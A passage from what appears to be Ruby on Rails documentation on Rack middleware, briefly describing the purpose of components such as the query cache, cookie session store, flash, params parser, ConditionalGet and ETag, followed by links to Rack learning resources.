**`ActiveRecord::QueryCache`**
* Enables the Active Record query cache.
**`ActionDispatch::Cookies`**
* Sets cookies for the request.
**`ActionDispatch::Session::CookieStore`**
* Responsible for storing the session in cookies.
**`ActionDispatch::Flash`**
* Sets up the flash keys. 
**`ActionDispatch::ParamsParser`**
* Parses out parameters from the request into `params`.
* Converts HEAD requests to `GET` requests and serves them as so.
**`Rack::ConditionalGet`**
* Adds support for "Conditional `GET`" so that server responds with nothing if page wasn't changed.
**`Rack::ETag`**
* Adds ETag header on all String bodies. 
ETags are used to validate cache.
TIP: It's possible to use any of the above middlewares in your custom Rack stack.
Resources
### Learning Rack
* [Official Rack Website](http://rack.github.io)
* [Introducing Rack](http://chneukirchen.org/blog/archive/2007/02/introducing-rack.html)
* [Ruby on Rack #1 - Hello Rack!](
* [Ruby on Rack #2 - The Builder](http://m.onkey.org/ruby-on-rack-2-the-builder)
### Understanding Middlewares
* [Railscast on Rack Middlewares](http://railscasts.com/episodes/151-rack-middleware)
